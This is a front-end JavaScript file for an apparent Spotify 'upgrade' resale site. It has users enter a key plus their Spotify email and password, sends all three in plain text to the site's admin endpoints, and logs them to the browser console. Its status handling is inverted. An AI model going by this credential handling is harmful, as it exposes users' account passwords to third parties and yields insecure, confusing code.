const chooseItems = document.querySelectorAll(
    ".upgrade-section-2 .content .choose .choose-item"
);

const items = document.querySelectorAll(
    ".upgrade-section-2 .content .chosen-content .item"
);
$.ajax({
    type: "GET",
    url: `https://www.spotifygold.com/admin/getStock`,
    dataType: "json",
    contentType: "application/json",
    headers: {
        "Access-Control-Allow-Origin": "*",
    },
    success: (response) => {
        $("#stock").text("Upgrades in stock: " + response["total"]);
    },
});
const btn1 = document.getElementById("btn1");
const btn2 = document.getElementById("btn2");
const btn3 = document.getElementById("btn3");
let key, email, password;
btn1.addEventListener("click", () => {
    // spinner
    let html = $("#btn1").html();
    $("#btn1").html('<div class="spinner"></div>');

    key = $("input[name='key']").val();
    if (key.length > 10) {
        if (document.title.includes("Replacement")) {
            let postData = {
                key: key.replace(/\s/g, ""),
            };

            $.ajax({
                type: "POST",
                url: `https://www.spotifygold.com/admin/getEmail`,
                dataType: "json",
                contentType: "application/json",
                data: JSON.stringify(postData),
                headers: {
                    "Access-Control-Allow-Origin": "*",
                },
                success: (response) => {
                    if (response["status"] == 400) {
                        $("#email").val(response.key);
                        items.forEach((item) => {
                            item.classList.remove("active");
                        });
                        chooseItems.forEach((item) => {
                            item.classList.remove("active");
                        });
                        chooseItems[1].classList.add("active");
                        items[1].classList.add("active");
                    } else {
                        $("#keyError").text("�  Please check the key.");
                        $("#btn1").html(html);
                    }
                },
            });
        } else {
            items.forEach((item) => {
                item.classList.remove("active");
            });
            chooseItems.forEach((item) => {
                item.classList.remove("active");
            });
            chooseItems[1].classList.add("active");
            items[1].classList.add("active");
        }
    } else {
        $("#keyError").text("�  Please check the key.");
        $("#btn1").html(html);
    }
});

btn2.addEventListener("click", () => {
    email = $("input[name='email']").val();
    password = $("input[name='password']").val();
    if (password.length > 2) {
        items.forEach((item) => {
            item.classList.remove("active");
        });
        chooseItems.forEach((item) => {
            item.classList.remove("active");
        });
        chooseItems[2].classList.add("active");
        items[2].classList.add("active");
    } else {
        $("#accountError").text("�  Please check the account details.");
    }
});

// Modal
function openModal() {
    // CAT FACT!
    var factPlaceholder = document.getElementById("catFact");

    var CatFacts = [
        "The ancient Egyptians were the first to tame the cat (in about 3000 BC), and used them to control pests.",
        "Cats share 95.6% of their DNA with tigers.",
        "Cats are asleep for 70% of their lives.",
        "Cat kidneys are super efficient, they can rehydrate by drinking seawater.",
        "Kittens who are taken along on short, trouble-free car trips to town tend to make good passengers when they get older. They get used to the sounds and motions of traveling and make less connection between the car and the visits to the vet.",
    ];

    function randomFact() {
        return CatFacts[factNumber];
    }

    var factNumber;
    factNumber = Math.floor(Math.random() * 5);
    factPlaceholder.textContent = randomFact();
    modal.style.display = "block";
}

// Get the modal
var modal = document.getElementById("myModal");

function upgrade() {
    openModal();
    key = $("input[name='key']").val();
    email = $("input[name='email']").val();
    password = $("input[name='password']").val();
    let postData = {
        key: key.replace(/\s/g, ""),
        password: password,
        email: email,
    };
    console.log("Upgrading: " + JSON.stringify(postData));
    $.ajax({
        type: "POST",
        url: `https://www.spotifygold.com/admin/upgrade`,
        dataType: "json",
        contentType: "application/json",
        data: JSON.stringify(postData),
        headers: {
            "Access-Control-Allow-Origin": "*",
        },
        success: (response) => {
            console.log(response);
            modal.style.display = "none";
            if (response.status == 200) {
                $("#errorText").text("Error: " + response.responseText);
                items.forEach((item) => {
                    item.classList.remove("active");
                });
                chooseItems.forEach((item) => {
                    item.classList.remove("active");
                });
                chooseItems[3].classList.add("active");
                items[4].classList.add("active");
            } else {
                items.forEach((item) => {
                    item.classList.remove("active");
                });
                chooseItems.forEach((item) => {
                    item.classList.remove("active");
                });
                chooseItems[3].classList.add("active");
                items[3].classList.add("active");
            }
        },
    });
}

function replace() {
    openModal();
    key = $("input[name='key']").val();
    email = $("input[name='email']").val();
    password = $("input[name='password']").val();
    let postData = {
        key: key.replace(/\s/g, ""),
        password: password,
        email: email,
    };
    console.log("Replacing: " + JSON.stringify(postData));
    $.ajax({
        type: "POST",
        url: `https://www.spotifygold.com/admin/replacement`,
        dataType: "json",
        contentType: "application/json",
        data: JSON.stringify(postData),
        headers: {
            "Access-Control-Allow-Origin": "*",
        },
        success: (response) => {
            console.log(response);
            modal.style.display = "none";
            if (response.status == 200) {
                $("#errorText").text("Error: " + response.responseText);
                items.forEach((item) => {
                    item.classList.remove("active");
                });
                chooseItems.forEach((item) => {
                    item.classList.remove("active");
                });
                chooseItems[3].classList.add("active");
                items[4].classList.add("active");
            } else {
                items.forEach((item) => {
                    item.classList.remove("active");
                });
                chooseItems.forEach((item) => {
                    item.classList.remove("active");
                });
                chooseItems[3].classList.add("active");
                items[3].classList.add("active");
            }
        },
    });
}
